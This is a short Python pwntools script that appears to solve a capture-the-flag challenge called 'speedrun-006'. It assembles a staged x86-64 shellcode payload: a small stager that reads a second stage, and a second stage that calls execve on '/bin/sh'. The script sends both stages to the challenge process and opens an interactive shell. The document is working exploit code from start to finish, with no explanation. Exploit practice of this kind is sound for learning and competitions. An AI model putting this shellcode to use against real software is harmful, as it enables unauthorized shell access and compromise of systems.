#!/usr/bin/python3

from pwn import *
from string import ascii_lowercase

context.arch = 'amd64'

first_code = '''
    mov dl, 26
    jmp first+0x1
    nop
first:
    nop
    nop
    jmp second+0x1
second:
    lea rsi, [rip-0x12]
    jmp third+0x1
third:
    nop
    nop
    nop
    nop
    syscall
    jmp rsi
    '''

second_code = '''
    mov rax, 0x68732f6e69622f
    xor edx, edx
    xchg rdi, rsi
    mov [rdi], rax
    xor eax, eax
    add ax, 59
    syscall
    '''

deltas = [5, 4, 9, 8]
first_sc = asm(first_code)
second_sc = asm(second_code)

print(disasm(second_sc))

print(f'{first_sc} is {len(first_sc)} bytes long')
print(f'{second_sc} is {len(second_sc)} bytes long')

elf = ELF('speedrun-006')
p = process(elf.path)

if args.GDB:
    gdb.attach(p, '''
        brva 0x9f5
        continue
        ''')

p.sendafter(b'ride\n', first_sc)
p.send(second_sc)

p.interactive()
